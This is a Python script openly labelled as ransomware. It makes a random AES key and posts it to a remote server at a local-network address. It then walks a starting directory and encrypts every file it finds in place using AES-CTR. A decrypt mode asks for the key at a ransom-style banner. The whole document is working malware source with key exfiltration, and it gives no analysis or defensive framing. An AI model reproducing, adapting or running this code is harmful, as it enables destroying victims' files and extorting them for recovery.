#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
from random import randint
from string import printable
import argparse
import os
import requests

import discover
import modify


def generate_key():
	key_len=[16,24,32]
	key_domain=printable[:94]
	rand_len=key_len[randint(0,2)]
	KEY=""
	for i in range(rand_len):
		KEY+=key_domain[randint(0,len(key_domain)-1)]
	remote_server="http://192.168.43.108:8080/server.php"
	params={"key":KEY}
	response=requests.post(remote_server,params)
	if (response.status_code==200) and ("True" in response.text):	
		return KEY
	else:
		print("Communication Error")
		exit(0)

def get_parser():
    parser = argparse.ArgumentParser(description='Ransomware')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print '''
Ransomware!
---------------
Your files have been encrypted.


'''
        key = raw_input('Enter Your Key> ')
    else:
        key = generate_key()

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    startdirs = ['/media/bin4rygh0st/UBUNTU 19_1/']

    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
        print("Your System has been Decrypted!!")

    for _ in range(100):
        key = randint(0,999999999999)
        pass

    if not decrypt:
        pass

if __name__=="__main__":
    main()

